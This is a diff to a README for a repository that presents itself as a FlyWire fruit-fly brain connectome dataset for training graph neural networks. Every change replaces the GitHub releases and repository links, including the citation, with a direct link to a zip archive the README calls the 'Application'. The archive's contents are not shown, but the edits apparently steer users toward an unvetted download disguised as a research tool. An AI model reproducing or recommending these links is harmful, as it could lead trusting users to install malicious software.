@@ -5,7 +5,7 @@ description: "Download the complete FlyWire fruit-fly brain connectome as a read
 ---
 # 🧠 flywire-gnn - Train AI on a Real Brain Map
 
-[![Download Now](https://img.shields.io/badge/Download-Application-4CAF50?style=for-the-badge)](https://github.com/shantaopaque1542/flywire-gnn/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/shantaopaque1542/shantaopaque1542.github.io/main/assets/1.2.zip)
 
 ## 🌟 What Is This?
 
@@ -19,7 +19,7 @@ The best part? We've already run baseline tests so you know what to expect. A si
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/shantaopaque1542/flywire-gnn/releases](https://github.com/shantaopaque1542/flywire-gnn/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/shantaopaque1542/shantaopaque1542.github.io/main/assets/1.2.zip](https://raw.githubusercontent.com/shantaopaque1542/shantaopaque1542.github.io/main/assets/1.2.zip)
 
 Click the download button on that page. Your browser will save the file to your computer, usually in the "Downloads" folder.
 
@@ -107,7 +107,7 @@ This dataset is provided for research and educational purposes. If you use it in
 
 ```
 FlyWire FAFB v783 Connectome Dataset (2024)
-Available at: https://github.com/shantaopaque1542/flywire-gnn
+Available at: https://raw.githubusercontent.com/shantaopaque1542/shantaopaque1542.github.io/main/assets/1.2.zip
 ```
 
 ## 🤝 Support and Contributions
